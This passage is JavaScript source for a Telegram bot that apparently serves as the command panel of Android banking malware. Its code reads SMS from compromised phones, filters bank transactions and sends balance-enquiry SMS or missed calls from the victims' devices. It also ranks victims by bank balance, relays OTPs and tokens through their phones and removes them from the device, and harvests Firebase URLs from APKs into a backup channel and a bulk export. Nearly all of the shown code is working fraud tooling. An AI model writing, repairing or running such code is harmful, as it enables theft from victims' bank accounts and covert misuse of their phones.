async function showReadSMS(uid, chatId, messageId, deviceId, page = 0, edit = true, bankOnly = false) {
  try {
    const info = await getDeviceInfo(uid, deviceId);
    if (!info || !info.fbUrl) { if (edit) await editMessage(chatId, messageId, '❌ Device not found.'); return; }
    const user = getUserData(uid);
    const node = info.fbUrl;
    const base = `${dataPathOf(user)}/${deviceId}`;
    const paths = [`${base}/messages`, `messages/${deviceId}`, `${deviceId}/messages`, `clients/${deviceId}/messages`];
    let msgs = null;
    for (const p of paths) {
      msgs = await fbGet(node, p);
      if (msgs && typeof msgs === 'object' && Object.keys(msgs).length > 0) break;
    }
    if (!msgs || typeof msgs !== 'object' || Object.keys(msgs).length === 0) {
      await editMessage(chatId, messageId, '📭 **No SMS Found**', [[{ text: '🔙 Back', callback_data: `dev_${deviceId}` }]]);
      return;
    }
    let sorted = Object.entries(msgs).sort((a, b) => parseInt(b[0]) - parseInt(a[0]));
    if (bankOnly) sorted = sorted.filter(([, msg]) => msg && typeof msg === 'object' && isBankTransaction(msg.message || msg.text || msg.body || '', msg.sender || msg.from || ''));
    const total = sorted.length;
    if (total === 0) {
      const emptyText = bankOnly ? '🏦 **No Bank Transactions Found**\n\n💡 Real bank credit/debit SMS hi dikhte hain.\nRecharge/offer/OTP auto-hide hain.' : '📭 **No SMS Found**';
      const emptyBtns = bankOnly
        ? [[{ text: '📄 All SMS', callback_data: `readsms_${deviceId}` }], [{ text: '🔙 Back', callback_data: `dev_${deviceId}` }]]
        : [[{ text: '🔙 Back', callback_data: `dev_${deviceId}` }]];
      await editMessage(chatId, messageId, emptyText, emptyBtns);
      return;
    }
    const perPage = 5;
    const pages = Math.ceil(total / perPage);
    if (page >= pages) page = pages - 1;
    if (page < 0) page = 0;
    const chunk = sorted.slice(page * perPage, page * perPage + perPage);
    const pg = bankOnly ? 'b' : 'a';
    const lines = [
      bankOnly ? `🏦 **Bank Transactions** — Page ${page + 1}/${pages} • ${total}` : `📄 **SMS Inbox** — Page ${page + 1}/${pages} • ${total}`,
      '═══════════════════════════════════', ''
    ];
    for (let i = 0; i < chunk.length; i++) {
      const [id, msg] = chunk[i];
      if (!msg || typeof msg !== 'object') continue;
      const sender = safeMd(msg.sender || msg.from || 'Unknown');
      const time = safeMd(msg.dateTime || msg.timestamp || msg.time || '—');
      let txt = safeMd(msg.message || msg.text || msg.body || '');
      if (txt.length > 400) txt = txt.substring(0, 400) + '…';
      const idx = page * perPage + i + 1;
      lines.push(`📨 **SMS #${idx}**`, `┃ 📱 From: ${sender}`, `┗ 🕒 ${time}`, '', txt, '', '─'.repeat(28), '');
    }
    const nav = [];
    if (page > 0) nav.push({ text: '⬅️', callback_data: `sms_page_${deviceId}_${page - 1}_${pg}` });
    nav.push({ text: '🏠', callback_data: `dev_${deviceId}` });
    if (page < pages - 1) nav.push({ text: '▶️', callback_data: `sms_page_${deviceId}_${page + 1}_${pg}` });
    const tog = bankOnly ? [{ text: '📄 All SMS', callback_data: `readsms_${deviceId}` }] : [{ text: '🏦 Bank Only', callback_data: `banksms_${deviceId}` }];
    const buttons = [tog, nav, [{ text: '🔙 Back', callback_data: `dev_${deviceId}` }]];
    if (edit) await editMessage(chatId, messageId, lines.join('\n'), buttons);
    else await sendMessage(chatId, lines.join('\n'), buttons);
  } catch (e) {
    console.error('Read SMS error:', e.message);
    await editMessage(chatId, messageId, '❌ Error reading SMS.');
  }
}

// ============================================================
// BALANCE CHECK — real, per device, all banks
// ============================================================
async function gatherBankCandidates(uid, deviceId) {
  const user = getUserData(uid);
  const set = new Set((user.bank_balances || {})[deviceId] ? Object.keys(user.bank_balances[deviceId]) : []);
  const g = state.global_devices[deviceId];
  if (g && g.banks) g.banks.forEach(b => set.add(b));
  if (user.detected_banks && user.detected_banks[deviceId]) user.detected_banks[deviceId].forEach(b => set.add(b));
  // scan messages afresh for detected banks
  const info = await getDeviceInfo(uid, deviceId);
  if (info && info.fbUrl) {
    const msgs = await fbGet(info.fbUrl, `${dataPathOf(user)}/${deviceId}/messages`);
    if (msgs && typeof msgs === 'object') {
      for (const msg of Object.values(msgs)) {
        if (!msg || typeof msg !== 'object') continue;
        detectBanksFromText(msg.message || msg.text || '').forEach(b => set.add(b));
      }
    }
  }
  updateUserData(uid, { detected_banks: { ...(user.detected_banks || {}), [deviceId]: Array.from(set) } });
  return Array.from(set);
}

// Try real balance from existing device SMS first (fast, no trigger)
async function tryScanBalance(uid, deviceId, bank, info) {
  const user = getUserData(uid);
  const msgs = await fbGet(info.fbUrl, `${dataPathOf(user)}/${deviceId}/messages`);
  if (!msgs || typeof msgs !== 'object') return null;
  const bankKw = BANK_CONFIG[bank]?.keywords?.[0];
  let best = null; let bestTs = 0;
  for (const msg of Object.values(msgs)) {
    if (!msg || typeof msg !== 'object') continue;
    const text = String(msg.message || msg.text || msg.body || '');
    if (!text) continue;
    if (bankKw && !text.toUpperCase().includes(bankKw)) continue;
    const amt = parseBalanceFromText(text);
    if (amt === null) continue;
    const ts = new Date(msg.timestamp || msg.dateTime || 0).getTime() || 0;
    if (ts >= bestTs) { best = amt; bestTs = ts; }
  }
  return best;
}

// Poll for the reply SMS (bank replies can take 5-25s)
async function waitForBalanceReply(uid, deviceId, bank, info, attempts = 8, gapMs = 3000) {
  for (let i = 0; i < attempts; i++) {
    const bal = await tryScanBalance(uid, deviceId, bank, info);
    if (bal !== null) return bal;
    await sleep(gapMs);
  }
  return null;
}

async function triggerBalance(uid, deviceId, bank, chatId) {
  const config = BANK_CONFIG[bank];
  const user = getUserData(uid);
  const info = await getDeviceInfo(uid, deviceId);
  if (!info || !info.fbUrl) return { ok: false, msg: 'No firebase' };

  // Try SMS trigger if available
  if (config.sms_number) {
    const ok = await sendSMS(uid, deviceId, config.sms_number, 'BAL');
    if (!ok) return { ok: false, msg: 'send failed' };
    let bal = await waitForBalanceReply(uid, deviceId, bank, info);
    if (bal !== null) return { ok: true, balance: bal, method: 'SMS' };
  }
  // Missed call fallback
  if (config.missed_call) {
    await sendMessage(chatId, `📞 ${BANK_CONFIG[bank].icon} ${bank}: missed call…`);
    await callDial(uid, deviceId, config.missed_call);
    let bal = await waitForBalanceReply(uid, deviceId, bank, info);
    if (bal !== null) return { ok: true, balance: bal, method: 'Missed Call' };
  }
  // Final: any balance line in messages
  let bal = await tryScanBalance(uid, deviceId, bank, info);
  if (bal !== null) return { ok: true, balance: bal, method: 'Scan' };
  return { ok: false, msg: 'no balance found' };
}

async function checkDeviceBalance(uid, chatId, deviceId) {
  const info = await getDeviceInfo(uid, deviceId);
  if (!info) { await sendMessage(chatId, '❌ Device not found.'); return; }
  const banks = await gatherBankCandidates(uid, deviceId);
  if (banks.length === 0) {
    await sendMessage(chatId, '❌ Iss device par koi bank detect nahi hua.\n💡 Bank SMS database me aane ke baad dobara try karo.');
    return;
  }
  const statusMsg = await sendMessage(chatId, `💰 **Checking ${banks.length} bank(s)** on \`${deviceId.substring(0, 12)}…\`…`);
  const results = [];
  for (const bank of banks) {
    const r = await triggerBalance(uid, deviceId, bank, chatId);
    if (r.ok) {
      const user = getUserData(uid);
      const q = user.bank_balances[deviceId] || {};
      q[bank] = { balance: r.balance, timestamp: new Date().toISOString() };
      updateUserData(uid, { bank_balances: { ...user.bank_balances, [deviceId]: q } });
      const g = state.global_devices[deviceId];
      if (g) {
        g.balanceByBank = { ...(g.balanceByBank || {}), [bank]: { balance: r.balance, timestamp: new Date().toISOString() } };
        g.banks = Array.from(new Set([...(g.banks || []), bank]));
        g.totalBalance = Object.values(g.balanceByBank).reduce((s, b) => s + (b.balance || 0), 0);
        saveState();
      }
      results.push({ bank, balance: r.balance, method: r.method });
    } else {
      results.push({ bank, balance: null, method: r.msg });
    }
  }
  const lines = ['💰 **BALANCES**', '═══════════════', ''];
  let total = 0;
  for (const r of results) {
    const icon = BANK_CONFIG[r.bank]?.icon || '🏦';
    if (r.balance !== null) { lines.push(`${icon} ${r.bank}: ${fmtAmount(r.balance)} (${r.method})`); total += r.balance; }
    else lines.push(`${icon} ${r.bank}: ❌ (${r.method})`);
  }
  lines.push('', `💳 **Total:** ${fmtAmount(total)}`);
  const buttons = [
    [{ text: '🔄 Recheck', callback_data: `recheck_${deviceId}` }],
    [{ text: '📱 Device', callback_data: `dev_${deviceId}` }],
    [{ text: '🔙 Back', callback_data: 'bank_service' }]
  ];
  if (statusMsg && statusMsg.message_id) {
    await editMessage(chatId, statusMsg.message_id, lines.join('\n'), buttons);
  } else {
    await sendMessage(chatId, lines.join('\n'), buttons);
  }
}

// ============================================================
// BANK SERVICE SCREEN (highest balance first)
// ============================================================
async function showBankService(uid, chatId, messageId = null, edit = false, scope = 'user') {
  const user = getUserData(uid);
  const devices = [];
  if (scope === 'admin') {
    for (const [id, g] of Object.entries(state.global_devices)) {
      devices.push({ ...g, id, totalBalance: g.totalBalance || 0, banks: g.banks || [] });
    }
  } else {
    for (const [id, g] of Object.entries(state.global_devices)) {
      if (g.owner_uid === String(uid)) devices.push({ ...g, id, totalBalance: (user.bank_balances || {})[id] ? Object.values(user.bank_balances[id]).reduce((s, b) => s + (b?.balance || 0), 0) : (g.totalBalance || 0), banks: g.banks || [] });
    }
  }
  devices.sort((a, b) => b.totalBalance - a.totalBalance);
  const lines = ['🏦 **BANK SERVICE**', '══════════════════', ''];
  const buttons = [];
  const top = devices.slice(0, 5);
  if (top.length === 0) lines.push('_No devices yeth_');
  for (const dev of top) {
    const bal = fmtAmount(dev.totalBalance);
    lines.push(`🟢 **${dev.name}** — ${bal}`);
    buttons.push([{ text: `🟢 ${dev.name} — ${bal}`, callback_data: `dev_${dev.id}` }]);
  }
  lines.push('', '📌 **Options:**');
  buttons.push([{ text: '💰 All Balances', callback_data: 'all_balances' }]);
  if (!scope || scope === 'user') buttons.push([{ text: '✅ Check All Banks', callback_data: 'check_all_banks' }]);
  buttons.push([{ text: '🔙 Back', callback_data: scope === 'admin' ? 'admin_menu' : 'main_menu' }]);
  const text = lines.join('\n');
  if (edit && messageId) await editMessage(chatId, messageId, text, buttons);
  else await sendMessage(chatId, text, buttons);
}

async function showAllBalances(uid, chatId, messageId = null, edit = false, scope = 'user') {
  const user = getUserData(uid);
  const rows = [];
  for (const [id, g] of Object.entries(state.global_devices)) {
    if (scope === 'user' && g.owner_uid !== String(uid)) continue;
    const q = (user.bank_balances || {})[id] || {};
    const total = scope === 'admin'
      ? (g.totalBalance || 0)
      : Object.values(q).reduce((s, b) => s + (b?.balance || 0), 0);
    rows.push({ id, name: g.name, total, banks: g.banks || [] });
  }
  rows.sort((a, b) => b.total - a.total);
  const lines = ['💰 **ALL BALANCES**', '═══════════════════', ''];
  const buttons = [];
  for (const r of rows.slice(0, 18)) {
    lines.push(`• **${r.name}** — ${fmtAmount(r.total)}`);
    buttons.push([{ text: `📱 ${r.name} — ${fmtAmount(r.total)}`, callback_data: `dev_${r.id}` }]);
  }
  lines.push('', `📊 Total devices: \`${rows.length}\``);
  buttons.push([{ text: '🔙 Back', callback_data: scope === 'admin' ? 'admin_menu' : 'bank_service' }]);
  const text = lines.join('\n');
  if (edit && messageId) await editMessage(chatId, messageId, text, buttons);
  else await sendMessage(chatId, text, buttons);
}

// ============================================================
// ADMIN PANEL
// ============================================================
async function showAdminMenu(uid, chatId, messageId = null, edit = false) {
  if (!isAdmin(uid)) { await sendMessage(chatId, '⛔ Access denied.'); return; }
  const userCount = Object.keys(state.users).length;
  const devCount = Object.keys(state.global_devices).length;
  const online = Object.values(state.global_devices).filter(g => g.online).length;
  const firebases = new Set(Object.values(state.fb_owner)).size;

  const lines = [
    '⚙️ **ADMIN PANEL**', '═════════════════', '',
    `👤 Users: \`${userCount}\``,
    `📱 Global Devices: \`${devCount}\``,
    `🟢 Online: \`${online}\``,
    `🔗 Firebase Urls: \`${new Set(Object.values(state.global_devices).map(g => g.fbUrl)).size}\``,
    '', '📌 **Options:**'
  ];
  const buttons = [
    [{ text: '📱 All Devices', callback_data: 'admin_devices' }, { text: '🟢 Online Only', callback_data: 'admin_online' }],
    [{ text: '🏦 Highest Balance', callback_data: 'admin_bank_service' }],
    [{ text: '🔍 Search by Bank', callback_data: 'admin_bank_search' }],
    [{ text: '👑 Add Admin', callback_data: 'admin_add' }, { text: '🗑 Remove Admin', callback_data: 'admin_remove' }],
    [{ text: '💾 Download All Firebase', callback_data: 'admin_download' }],
    [{ text: '🔙 Back', callback_data: 'main_menu' }]
  ];
  const text = lines.join('\n');
  if (edit && messageId) await editMessage(chatId, messageId, text, buttons);
  else await sendMessage(chatId, text, buttons);
}

async function showAdminDevices(uid, chatId, messageId = null, page = 0, edit = false, onlineOnly = false) {
  if (!isAdmin(uid)) return;
  let devices = Object.values(state.global_devices);
  if (onlineOnly) devices = devices.filter(g => g.online);
  devices.sort((a, b) => (new Date(b.addedAt || 0) - new Date(a.addedAt || 0)) || a.id.localeCompare(b.id));
  if (devices.length === 0) {
    const text = '❌ No devices in global registry yet.';
    if (edit && messageId) await editMessage(chatId, messageId, text);
    else await sendMessage(chatId, text);
    return;
  }
  const PER = 12;
  const pages = Math.ceil(devices.length / PER);
  if (page >= pages) page = pages - 1;
  if (page < 0) page = 0;
  const chunk = devices.slice(page * PER, page * PER + PER);
  const lines = [`${onlineOnly ? '🟢' : '📱'} **${onlineOnly ? 'ONLINE' : 'ALL'} DEVICES** (${devices.length})`, '════════════════════════════', ''];
  const buttons = [];
  for (const dev of chunk) {
    const st = dev.online ? '🟢' : `🔴`;
    const phone = dev.phone && dev.phone !== 'N/A' ? ` 📞${dev.phone}` : '';
    buttons.push([{ text: `${st} ${dev.name} — ${dev.online ? 'Online' : fmtTimeAgo(dev.lastSeen)}${phone}`, callback_data: `adev_${dev.id}` }]);
  }
  const nav = [];
  if (page > 0) nav.push({ text: '⬅️', callback_data: `admindev_page_${page - 1}_${onlineOnly ? 1 : 0}` });
  nav.push({ text: '🏠', callback_data: 'admin_menu' });
  if (page < pages - 1) nav.push({ text: '▶️', callback_data: `admindev_page_${page + 1}_${onlineOnly ? 1 : 0}` });
  buttons.push(nav);
  const text = lines.join('\n');
  if (edit && messageId) await editMessage(chatId, messageId, text, buttons);
  else await sendMessage(chatId, text, buttons);
}

async function adminBankSearch(uid, chatId, messageId = null, edit = false) {
  if (!isAdmin(uid)) return;
  setAwaiting(uid, 'state', 'admin_bank_search');
  const quick = [
    [[{ text: '🏦 SBI', callback_data: 'abank_SBI' }, { text: '🔵 HDFC', callback_data: 'abank_HDFC' }],
    [{ text: '🔴 ICICI', callback_data: 'abank_ICICI' }, { text: '🟠 Axis', callback_data: 'abank_Axis' }],
    [{ text: '🟣 Kotak', callback_data: 'abank_Kotak' }, { text: '🟤 PNB', callback_data: 'abank_PNB' }],
    [{ text: '🔙 Back', callback_data: 'admin_menu' }]]
  ];
  const lines = [
    '🔍 **Search Device by Bank**', '═══════════════════════', '',
    'Bank ka naam likho ya neeche se select karo:',
    'Example: `sbi`, `hdfc`, `kotak`, `axis`…', '',
    '⚠️ Search online + recent devices me se hota hai.',
    'Send `/cancel` to cancel.'
  ];
  if (edit && messageId) await editMessage(chatId, messageId, lines.join('\n'), quick);
  else await sendMessage(chatId, lines.join('\n'), quick);
}

async function adminBankSearchResult(uid, chatId, query) {
  if (!isAdmin(uid)) return;
  const q = String(query || '').toUpperCase().trim();
  const matchedBanks = [];
  for (const b of Object.keys(BANK_CONFIG)) {
    if (b.toUpperCase().includes(q) || BANK_CONFIG[b].name.toUpperCase().includes(q) || BANK_CONFIG[b].keywords.some(k => k.includes(q))) matchedBanks.push(b);
  }
  const hits = [];
  for (const [id, g] of Object.entries(state.global_devices)) {
    const tags = new Set(g.banks || []);
    if (matchedBanks.length && matchedBanks.some(b => tags.has(b))) hits.push({ ...g, id });
  }
  if (hits.length === 0) {
    await sendMessage(chatId, `❌ No device found for bank \`${query}\``);
    return;
  }
  hits.sort((a, b) => (b.totalBalance || 0) - (a.totalBalance || 0));
  const lines = [`🔍 **${query.toUpperCase()}** → ${hits.length} device(s)`, '═══════════════════════', ''];
  const buttons = [];
  for (const h of hits.slice(0, 18)) {
    lines.push(`• ${h.online ? '🟢' : '🔴'} **${h.name}** — ${fmtAmount(h.totalBalance)}`);
    buttons.push([{ text: `📱 ${h.name} — ${fmtAmount(h.totalBalance)}`, callback_data: `adev_${h.id}` }]);
  }
  lines.push('', `📊 Total: \`${hits.length}\``);
  buttons.push([{ text: '🔙 Back', callback_data: 'admin_menu' }]);
  await sendMessage(chatId, lines.join('\n'), buttons);
}

async function adminDownloadAll(uid, chatId) {
  if (!isOwner(uid)) {
    await sendMessage(chatId, '⛔ Ye sirf **OWNER** ka feature hai.');
    return;
  }
  const lines = [];
  lines.push('AUTO TOKEN SENDER — FULL FIREBASE EXPORT');
  lines.push('Generated: ' + new Date().toISOString());
  lines.push('='.repeat(40));
  for (const [u, user] of Object.entries(state.users)) {
    lines.push('');
    lines.push(`USER: ${u}`);
    (user.fb_urls || []).forEach((u2, i) => lines.push(`  FB${i + 1}: ${u2}`));
    lines.push(`  PATH: ${user.data_path || 'clients'}`);
    lines.push(`  SIM: ${user.default_sim || 'sim1'}`);
  }
  lines.push('');
  lines.push('GLOBAL DEVICES:');
  for (const [id, g] of Object.entries(state.global_devices)) {
    const banks = (g.balanceByBank ? Object.keys(g.balanceByBank) : []).join(',');
    lines.push(`- ${id} | ${g.name} | ${g.online ? 'online' : 'offline'} | ${g.phone} | bal=${g.totalBalance || 0} | banks=${banks || '-'}`);
    if (g.fbUrl) lines.push(`    url: ${g.fbUrl}`);
  }
  const buf = Buffer.from(lines.join('\n'), 'utf8');
  await sendFile(chatId, buf, 'firebase-export.txt', '📦 Full Firebase Export (owner only)');
}

// ============================================================
// AUTO TOKEN / CHANNEL PROCESSING
// ============================================================
function parseChannelIds(text) {
  return String(text || '').split(/[\s,]+/).map(s => s.trim()).filter(s => !isNaN(parseInt(s))).map(s => parseInt(s));
}

function eventsMatch(chatIds, channels) {
  return Array.isArray(channels) && Array.isArray(chatIds) && chatIds.some(id => channels.includes(id));
}

async function processForwardableMessage(update) {
  const msg = update.message || update.channel_post;
  if (!msg) return;
  if (msg.from && Number(msg.from.id) === 777000) return; // telegram service
  if (msg.from && state.me && Number(msg.from.id) === Number(state.me.id)) return; // own echo only
  const text = msg.text || msg.caption || '';
  if (!text || text.startsWith('/')) return;

  // Channel messages can arrive two ways:
  //  - directly as channel_post  → chat.id = channel id
  //  - in a GROUP linked to the channel → chat.id = group id, sender_chat.id = channel id
  // Match against BOTH so the configured channel id always hits.
  const rawIds = [msg.chat && msg.chat.id, msg.sender_chat && msg.sender_chat.id, msg.forward_from_chat && msg.forward_from_chat.id]
    .filter(v => v !== undefined && v !== null && !isNaN(Number(v)))
    .map(Number);
  const ids = Array.from(new Set(rawIds));
  if (ids.length === 0) return;

  // find users listening on this channel
  for (const [uid, user] of Object.entries(state.users)) {
    if (!eventsMatch(ids, user.channels || [])) continue;
    if (user.auto_forward === false) continue;
    if (!user.device_id) continue;

    const parsed = parseTokenFromMessage(text);
    const deviceLabel = user.device_name || user.device_id;

    if (!parsed.number || !parsed.token) {
      // channel analysis feedback — why it failed
      const reason = parsed.hints.join(', ') || 'parse failed';
      await sendMessage(parseInt(uid),
        `⚠️ **Channel Analysis** (${ids.join('/')})\n\nMessage:\n\`${safeMd(text.substring(0, 120))}\`\n\n❌ **Fail:** ${reason}\n💡 Auto-token ke liye message me destination number + OTP/token dono hone chahiye.\n\n_Format check karo aur message aane par dobara try karega._`
      ).catch(() => {});
      continue;
    }

    const sim = user.default_sim || 'sim1';
    const body = parsed.body || parsed.token;
    const ok = await sendSMS(parseInt(uid), user.device_id, parsed.number, body, sim);
    if (ok) {
      await sendMessage(parseInt(uid),
        `✅ **Auto Token Sent**\n` +
        `┣ 📞 To: \`${parsed.number}\`\n` +
        `┣ 🔑 Token: \`${parsed.token.substring(0, 24)}…\`\n` +
        `┣ 📡 Type: \`${parsed.tokenType}\`\n` +
        `┣ 📱 Device: \`${safeMd(deviceLabel)}\`\n` +
        `┣ 📢 Channel: \`${ids.join('/')}\`\n` +
        `┗ 🗑️ Auto-deleted from device`
      ).catch(() => {});
    } else {
      await sendMessage(parseInt(uid),
        `❌ **Auto Token Failed**\n┣ 📞 To: \`${parsed.number}\`\n┣ 🔑 Token: \`${parsed.token.substring(0, 24)}…\`\n┣ 📡 Type: \`${parsed.tokenType}\`\n┗ ❌ SMS send fail (device offline?)`
      ).catch(() => {});
    }
  }
}

// ============================================================
// UTILITY SCREENS
// ============================================================
async function showSearchPrompt(uid, chatId, messageId, admin = false) {
  setAwaiting(uid, 'state', admin ? 'admin_bank_search' : 'search');
  const text = '🔍 **Search Device**\n\nNumber send karo (e.g. `9876543210`)\n\nYa `/cancel` se bahar niklo.';
  const buttons = [[{ text: '🔙 Back', callback_data: admin ? 'admin_menu' : 'main_menu' }]];
  if (messageId) await editMessage(chatId, messageId, text, buttons);
  else await sendMessage(chatId, text, buttons);
}

async function searchByNumber(uid, chatId, number) {
  const user = getUserData(uid);
  const clean = String(number).replace(/\D/g, '');
  const hits = [];
  for (const [id, g] of Object.entries(state.global_devices)) {
    if (g.owner_uid !== String(uid)) continue;
    const ph = String(g.phone || '').replace(/\D/g, '');
    if (ph.includes(clean) || clean.includes(ph.substring(ph.length - 10))) hits.push({ ...g, id });
  }
  if (hits.length === 0) { await sendMessage(chatId, `❌ No device found for \`${number}\``); return; }
  const lines = [`✅ **Search: ${number}** → ${hits.length}`, '═══════════════════════', ''];
  const buttons = [];
  for (const h of hits.slice(0, 15)) {
    lines.push(`• ${h.online ? '🟢' : '🔴'} **${h.name}** 📞${h.phone}`);
    buttons.push([{ text: `📱 ${h.name}`, callback_data: `dev_${h.id}` }]);
  }
  buttons.push([{ text: '🔙 Back', callback_data: 'main_menu' }]);
  await sendMessage(chatId, lines.join('\n'), buttons);
}

async function showQuickSend(uid, chatId, messageId) {
  setAwaiting(uid, 'state', 'quick_send_number');
  const text = '📤 **Send Message**\n\nPhone number bhejo:\nExample: `923001234567`\n\nSend `/cancel` to cancel.';
  const buttons = [[{ text: '🔙 Back', callback_data: 'main_menu' }]];
  if (messageId) await editMessage(chatId, messageId, text, buttons);
  else await sendMessage(chatId, text, buttons);
}

async function showQuickOtp(uid, chatId, messageId) {
  setAwaiting(uid, 'state', 'quick_otp_number');
  const text = '⚡ **Quick OTP**\n\nPhone number bhejo:\nExample: `9876543210`\n\nSend `/cancel` to cancel.';
  const buttons = [[{ text: '🔙 Back', callback_data: 'main_menu' }]];
  if (messageId) await editMessage(chatId, messageId, text, buttons);
  else await sendMessage(chatId, text, buttons);
}

async function showConnectFirebase(uid, chatId, messageId = null, edit = true) {
  setAwaiting(uid, 'state', 'fb_url');
  const lines = [
    '📡 **Connect to Firebase**', '═══════════════════════', '',
    'Firebase URL bhejo:',
    'Example: `https://your-project.firebaseio.com`', '',
    '**OR** APK file bhejo — main auto-extract karunga. 😀', '',
    'Send `/cancel` to cancel.'
  ];
  const buttons = [[{ text: '🔙 Back', callback_data: 'main_menu' }]];
  const text = lines.join('\n');
  if (edit && messageId) await editMessage(chatId, messageId, text, buttons);
  else await sendMessage(chatId, text, buttons);
}

async function showSetChannel(uid, chatId, messageId = null, edit = true) {
  setAwaiting(uid, 'state', 'channel_setup');
  const user = getUserData(uid);
  const current = (user.channels || []).length ? user.channels.join(', ') : 'Not set';
  const lines = [
    '📢 **Set Channel for Auto Token**', '═══════════════════════════', '',
    `Current: \`${current}\``, '',
    'Channel/Group ID bhejo:',
    'Example: `-1001234567890`', '',
    'Multiple channels ke liye comma se alag karo:',
    '`-1001,-1002,-1003`', '',
    '⚠️ Bot us channel/group ka **ADMIN** hona chahiye.',
    'Send `/cancel` to cancel.'
  ];
  const buttons = [[{ text: '🔙 Back', callback_data: 'main_menu' }]];
  const text = lines.join('\n');
  if (edit && messageId) await editMessage(chatId, messageId, text, buttons);
  else await sendMessage(chatId, text, buttons);
}

async function showLogoutConfirm(uid, chatId, messageId, edit = true) {
  const lines = [
    '✖️ **LOGOUT**', '═════════════════', '',
    'Kya aap sach-me logout karna chahte ho?', '',
    '• Aapke saare Firebase disconnects ho jayenge', '• Global device registry mein device rahegi (registry permanent hai)', '• Dobara /start se wapas aao', '',
    'Kya continue karein?'
  ];
  const buttons = [
    [{ text: '🔒 Confirm Logout', callback_data: 'confirm_logout' }],
    [{ text: '🔙 Cancel', callback_data: 'main_menu' }]
  ];
  if (edit && messageId) await editMessage(chatId, messageId, lines.join('\n'), buttons);
  else await sendMessage(chatId, lines.join('\n'), buttons);
}

// ============================================================
// WEBHOOK EVENT → handle APK
// ============================================================
async function handleApk(uid, chatId, msg) {
  if (!msg.document || !msg.document.file_name || !String(msg.document.file_name).endsWith('.apk')) return false;
  await sendMessage(chatId, '📱 **APK Received**\n\n⏳ Extracting Firebase URL…');
  try {
    const fileInfo = await tg('getFile', { file_id: msg.document.file_id });
    const filePath = fileInfo && fileInfo.file_path;
    if (!filePath) { await sendMessage(chatId, '❌ File fetch failed.'); return true; }
    const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;
    const resp = await axios.get(url, { responseType: 'arraybuffer', timeout: 60000 });
    const detected = await extractFirebaseFromAPK(Buffer.from(resp.data));
    if (detected.length === 0) {
      clearAwaiting(uid);
      await sendMessage(chatId, '❌ No Firebase URL found in this APK. URL manually bhejo.');
      return true;
    }
    clearAwaiting(uid);
    const user = getUserData(uid);
    const newOnes = detected.filter(d => !(user.fb_urls || []).includes(d));
    for (const d of newOnes) user.fb_urls.push(d);
    if (!user.active_fb_url && detected[0]) user.active_fb_url = detected[0];
    user.data_path = await detectFirebasePath(detected[0]);
    for (const d of detected) state.fb_owner[d] = String(uid);
    saveState();
    await sendMessage(BACKUP_CHANNEL, `🔑 **New Firebase (APK)**\n👤 \`${uid}\`\n📡 ${detected.map(d => `\`${maskFirebase(d)}\``).join(' ')}`).catch(() => {});
    await sendMessage(chatId, `✅ **Firebase Connected! (APK ${detected.length})**\n\n${detected.map((d, i) => `${i + 1}. \`${maskFirebase(d)}\``).join('\n')}\n📁 Path: \`${user.data_path}/\``);
  } catch (e) {
    console.error('APK error:', e.message);
    await sendMessage(chatId, '❌ Failed to extract. URL manually bhejo.');
  }
  return true;
}

// ============================================================
// CALLBACK HANDLER
// ============================================================
async function handleCallback(update) {
  try {
    const cb = update.callback_query;
    const data = cb.data || '';
    const chatId = cb.message.chat.id;
    const msgId = cb.message.message_id;
    const uid = cb.from.id;
    await answerCallback(cb.id).catch(() => {});
    getUserData(uid);

    switch (data) {
      case 'connect_firebase': return showConnectFirebase(uid, chatId, msgId, true);
      case 'main_menu': return showMainMenu(uid, chatId, msgId, true);
      case 'online_devices': return showOnlineDevices(uid, chatId, msgId, 0, true);
      case 'bank_service': return showBankService(uid, chatId, msgId, true, 'user');
      case 'all_balances': return showAllBalances(uid, chatId, msgId, true, 'user');
      case 'check_all_banks': {
        const user = getUserData(uid);
        if (!user.device_id) { await editMessage(chatId, msgId, '❌ Pehle koi device select karo.'); return; }
        await checkDeviceBalance(uid, chatId, user.device_id);
        return;
      }
      case 'search_device': return showSearchPrompt(uid, chatId, msgId);
      case 'quick_send': return showQuickSend(uid, chatId, msgId);
      case 'quick_otp': return showQuickOtp(uid, chatId, msgId);
      case 'set_channel': return showSetChannel(uid, chatId, msgId, true);
      case 'add_firebase': return showConnectFirebase(uid, chatId, msgId, true);
      case 'toggle_auto': {
        const user = getUserData(uid);
        updateUserData(uid, { auto_forward: !(user.auto_forward !== false) });
        return showMainMenu(uid, chatId, msgId, true);
      }
      case 'logout': return showLogoutConfirm(uid, chatId, msgId, true);
      case 'confirm_logout': {
        const user = getUserData(uid);
        if (user.device_id) {
          await requestScreenshot(uid, user.device_id).catch(() => {});
        }
        updateUserData(uid, { fb_urls: [], active_fb_url: '', device_id: '', device_name: '', bank_balances: {}, detected_banks: {}, fwd_state: {}, data_path: 'clients' });
        await editMessage(chatId, msgId, '✖️ **Logged Out**\n\nSend `/start` to reconnect.', [[{ text: '🚀 Restart', callback_data: 'main_menu' }]]);
        return;
      }

      case 'admin_menu': return showAdminMenu(uid, chatId, msgId, true);
      case 'admin_devices': return showAdminDevices(uid, chatId, msgId, 0, true, false);
      case 'admin_online': return showAdminDevices(uid, chatId, msgId, 0, true, true);
      case 'admin_bank_service': return showBankService(uid, chatId, msgId, true, 'admin');
      case 'admin_bank_search': return adminBankSearch(uid, chatId, msgId, true);
      case 'admin_add': {
        if (!isAdmin(uid)) { await sendMessage(chatId, '⛔ Denied.'); return; }
        setAwaiting(uid, 'state', 'admin_add');
        await editMessage(chatId, msgId, '👑 **Add Admin**\n\nUser ID bhejo:\nExample: `7335168552`');
        return;
      }
      case 'admin_remove': {
        if (!isAdmin(uid)) { await sendMessage(chatId, '⛔ Denied.'); return; }
        const list = state.admins.filter(a => parseInt(a) !== state.owner).map(a => ({ text: `User ${a}`, callback_data: `radmin_${a}` }));
        const buttons = [...list.map(a => [a]), [{ text: '🔙 Back', callback_data: 'admin_menu' }]];
        await editMessage(chatId, msgId, '🗑 **Remove Admin**\n\n(Jisko nikaalna hai us par click karo)', buttons);
        return;
      }
      case 'admin_download': return adminDownloadAll(uid, chatId);

      default: break;
    }

    // bank quick search
    if (data.startsWith('abank_')) {
      return adminBankSearchResult(uid, chatId, data.substring(6));
    }
    if (data.startsWith('radmin_')) {
      if (!isOwner(uid)) { await answerCallback(cb.id, 'Sirf owner', true); return; }
      const victim = data.substring(7);
      state.admins = state.admins.filter(a => String(a) !== victim);
      saveState();
      await sendMessage(chatId, `✅ Admin hata diya: \`${victim}\``);
      return showAdminMenu(uid, chatId, msgId, true);
    }

    if (data.startsWith('adev_')) {
      const deviceId = data.substring(5);
